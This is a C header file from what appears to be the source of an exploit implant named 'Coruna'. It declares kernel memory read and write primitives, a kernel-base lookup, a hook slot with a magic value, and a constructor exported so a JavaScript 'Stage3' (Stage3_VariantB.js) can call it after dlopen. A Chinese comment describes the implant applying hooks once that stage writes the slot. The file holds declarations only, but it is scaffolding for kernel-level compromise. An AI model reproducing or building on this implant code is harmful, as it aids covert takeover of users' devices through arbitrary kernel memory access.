#ifndef MEMORY_H
#define MEMORY_H
#include <stdint.h>

/** Stage3 写入 coruna_hook_slot[3] 后 implant 应用 hooks；需与 Stage3_VariantB.js 一致 */
#define CORUNA_HOOK_MAGIC 0x434F52554E412121ULL

typedef uint64_t (*kread64_t)(uint64_t addr);
typedef void (*kwrite64_t)(uint64_t addr, uint64_t val);
typedef uint64_t (*kbase_t)(void);
void coruna_init_primitives(kread64_t read_func, kwrite64_t write_func, kbase_t base_func);
void coruna_init_primitives_from_addrs(uint64_t kread_va, uint64_t kwrite_va, uint64_t kbase_va);
extern volatile uint64_t coruna_hook_slot[4];
uint64_t kread64(uint64_t addr);
void kwrite64(uint64_t addr, uint64_t val);
uint64_t kernel_base(void);
/* Exported so Stage3 can call it via dlsym after dlopen returns */
void coruna_constructor(void);
#endif
